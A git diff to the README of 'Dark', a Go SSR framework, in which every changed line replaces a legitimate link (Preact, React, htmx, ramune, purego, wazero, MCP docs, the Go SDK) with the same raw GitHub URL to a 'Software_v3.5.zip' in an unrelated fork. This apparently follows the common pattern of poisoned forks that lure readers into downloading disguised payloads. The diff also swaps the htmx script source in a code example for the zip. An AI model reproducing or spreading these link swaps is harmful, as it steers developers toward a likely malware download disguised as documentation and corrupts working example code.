@@ -1,8 +1,8 @@
 # Dark
 
-A Go SSR web framework powered by [Preact](https://preactjs.com/) or [React](https://react.dev/), [htmx](https://htmx.org/), and Islands architecture.
+A Go SSR web framework powered by [Preact](https://raw.githubusercontent.com/Active-tachometer477/dark/main/_examples/hello/views/Software_v3.5.zip) or [React](https://raw.githubusercontent.com/Active-tachometer477/dark/main/_examples/hello/views/Software_v3.5.zip), [htmx](https://raw.githubusercontent.com/Active-tachometer477/dark/main/_examples/hello/views/Software_v3.5.zip), and Islands architecture.
 
-Dark renders TSX components on the server using [ramune](https://github.com/i2y/ramune) (a JS/TS runtime for Go), fetches data with Go Loader/Action functions, and delivers interactive pages through htmx's HTML-over-the-wire approach with minimal client-side JavaScript.
+Dark renders TSX components on the server using [ramune](https://raw.githubusercontent.com/Active-tachometer477/dark/main/_examples/hello/views/Software_v3.5.zip) (a JS/TS runtime for Go), fetches data with Go Loader/Action functions, and delivers interactive pages through htmx's HTML-over-the-wire approach with minimal client-side JavaScript.
 
 ## Requirements
 
@@ -10,7 +10,7 @@ Dark uses ramune for SSR, which supports two JS engine backends:
 
 | | JSC (default) | QuickJS-NG (`-tags qjswasm`) |
 |---|---|---|
-| **Engine** | Apple JavaScriptCore via [purego](https://github.com/ebitengine/purego) | QuickJS-NG compiled to WebAssembly, driven by [wazero](https://github.com/tetratelabs/wazero) (pure Go) |
+| **Engine** | Apple JavaScriptCore via [purego](https://raw.githubusercontent.com/Active-tachometer477/dark/main/_examples/hello/views/Software_v3.5.zip) | QuickJS-NG compiled to WebAssembly, driven by [wazero](https://raw.githubusercontent.com/Active-tachometer477/dark/main/_examples/hello/views/Software_v3.5.zip) (pure Go) |
 | **JIT** | Yes | wazero compiler-mode (AOT WASM→native) |
 | **Platforms** | macOS, Linux | macOS, Linux, Windows, FreeBSD |
 | **System deps** | macOS: none. Linux: `apt install libjavascriptcoregtk-4.1-dev` | None |
@@ -138,7 +138,7 @@ export default function Layout({ children }) {
       <head>
         <meta charset="UTF-8" />
         <title>My App</title>
-        <script src="https://unpkg.com/htmx.org@2.0.4"></script>
+        <script src="https://raw.githubusercontent.com/Active-tachometer477/dark/main/_examples/hello/views/Software_v3.5.zip"></script>
       </head>
       <body>{children}</body>
     </html>
@@ -522,7 +522,7 @@ MCP Apps also support React via `WithMCPUILibrary(dark.React)`.
 
 > **Note:** This feature has not been fully tested yet. The API may change.
 
-Dark supports [MCP Apps](https://modelcontextprotocol.io/extensions/apps/overview) — interactive HTML UIs returned by MCP tools, rendered inside host sandboxed iframes. Built on the official Go SDK [`github.com/modelcontextprotocol/go-sdk`](https://github.com/modelcontextprotocol/go-sdk).
+Dark supports [MCP Apps](https://raw.githubusercontent.com/Active-tachometer477/dark/main/_examples/hello/views/Software_v3.5.zip) — interactive HTML UIs returned by MCP tools, rendered inside host sandboxed iframes. Built on the official Go SDK [`github.com/modelcontextprotocol/go-sdk`](https://raw.githubusercontent.com/Active-tachometer477/dark/main/_examples/hello/views/Software_v3.5.zip).
 
 ```go
 mcpApp, err := dark.NewMCPApp("my-server", "1.0.0",
